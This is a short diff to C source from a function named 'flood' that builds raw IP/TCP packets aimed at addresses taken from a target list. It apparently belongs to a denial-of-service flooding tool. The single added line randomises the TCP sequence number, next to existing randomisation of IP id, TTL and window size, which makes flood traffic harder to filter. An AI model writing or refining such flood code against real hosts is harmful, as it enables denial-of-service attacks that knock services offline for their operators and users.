@@ -296,7 +296,7 @@ void *flood(void *par1)
 		iph->daddr = list_node->data.sin_addr.s_addr;
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
 		iph->check = csum((unsigned short *)datagram, iph->tot_len);
-
+		tcph->seq = htonl(randnum(1000000, 9999999));
 		iph->ttl = randnum(64, 255);
 		tcph->window = htons(windows[rand_cmwc() % 4]);
 
